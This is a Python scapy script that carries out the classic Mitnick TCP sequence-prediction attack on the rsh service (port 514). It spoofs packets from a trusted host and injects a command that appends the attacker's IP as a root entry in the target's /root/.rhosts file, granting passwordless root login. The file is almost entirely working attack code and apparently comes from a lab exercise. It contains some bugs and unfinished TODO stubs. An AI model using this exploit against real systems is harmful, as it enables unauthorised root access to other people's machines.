from scapy.all import *

import sys
import random
import time
import random

MIN_PORT = 513
MAX_PORT = 1023
TCP_SEQ_INC = (1024*125)
TCP_MAX_SEQ = (2**32-1)
INIT_SEQ = 10**4
INIT_ACK = random.randint(0,INIT_SEQ)
sport = random.randint(MIN_PORT,MAX_PORT)
dport = 514
TIMEOUT = 5
SLEEP   = 1
conf.iface = sys.argv[1]
target_ip = sys.argv[2]
trusted_host_ip = sys.argv[3]
my_ip = get_if_addr(sys.argv[1])
mitnick = "\00root\00root\00echo '{} root' >> /root/.rhosts\00".format(my_ip)

def make_syn(src=trusted_host_ip,dst=target_ip,dport=dport,sport=sport,seq=INIT_SEQ):
    return IP(src=src,dst=dst)/TCP(dport=dport,sport=sport,seq=seq,flags="S")

def make_ack(src=trusted_host_ip,dst=target_ip,dport=dport,sport=sport,seq=INIT_SEQ,ack=INIT_ACK):
    return IP(src=src,dst=dst)/TCP(dport=dport,sport=sport,seq=seq,flags="A",ack=ack)

def make_rst(src=trusted_host_ip,dst=target_ip,dport=dport,sport=sport,seq=INIT_SEQ,ack=INIT_ACK):
    return IP(src=src,dst=dst)/TCP(dport=dport,sport=sport,flags="R")

def make_exploit(src=trusted_host_ip,dst=target_ip,dport=dport,sport=sport,seq=INIT_SEQ,ack=INIT_ACK,exploit=mitnick):
    return IP(src=src,dst=dst)/TCP(dport=dport,sport=sport,seq=seq,flags="AP",ack=ack)/Raw(load=exploit)
################################## Exploit ####################################
seq=INIT_SEQ
sports = []
#for i in range(0, TCP_MAX_SEQ):
i = 0
while True:
    try: 

        seq=INIT_SEQ
        if i != 0 and i % 29 == 0:
            send(make_rst(dport=dport,sport=[e for e in sports]),verbose=False)
            del sports
            sports = []
            time.sleep(SLEEP)
            continue
        sport = random.randint(MIN_PORT,MAX_PORT)
        sports.append(sport)
        # Step 1: Information Gathering
        #print('Attempt {}: SPORT {}'.format(i,sport)) 
        syn = make_syn(src=my_ip,sport=sport,dport=dport,seq=seq)
        ans = sr1(syn,timeout=TIMEOUT,verbose=False)
        if ans is None:
            sendp(make_rst(dport=dport,sport=sport),verbose=False)
            #print('Bad answer')
            sports.remove(sport)
            continue
        #print('Got: {}'.format(ans.show()))
        send(make_rst(dport=dport,sport=sport),verbose=False)
        time.sleep(SLEEP)
        # Step 3: Trusted relationship hijacking
        ack  = ans[TCP].seq + TCP_SEQ_INC
        fakesyn = make_syn(sport=sport,dport=dport,seq=seq)
        send(fakesyn,verbose=False)
        time.sleep(SLEEP)
        ack += 1
        seq += 1
        seq %= TCP_MAX_SEQ
        fakeack = make_ack(seq=seq,ack=ack,sport=sport,dport=dport)
        send(fakeack,verbose=False)
        time.sleep(SLEEP)
        # Step 4: Remote Command Pump
        send(make_exploit(dport=dport,sport=sport,seq=seq,ack=ack),verbose=False)
        seq %= TCP_MAX_SEQ
        time.sleep(SLEEP)
        # Step 5: Clean up
        send(make_rst(dport=dport,sport=sport),verbose=False)
        time.sleep(SLEEP)
        resp = sr1(make_syn(src=my_ip),timeout=TIMEOUT,verbose=False)
        #if resp is not None:
            #pass
        #    break
        [sports.remove(e) for e in sports]
        send(make_rst(src=my_ip))
        i +=1
        sys.exit(0)
    except KeyboardInterrupt:
        if sports is not None:
            send(make_rst(dport=dport,sport=[e for e in sports]),verbose=False)
        else:
            send(make_rsp(dport=dport,sport=[e for e in range(MIN_PORT,MAX_PORT)]),verbose=False)
        sys.exit(0)
if __name__ == "__main__":
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]

    my_ip = get_if_addr(sys.argv[1])

    #TODO: figure out SYN sequence number pattern

    #TODO: TCP hijacking with predicted sequence number
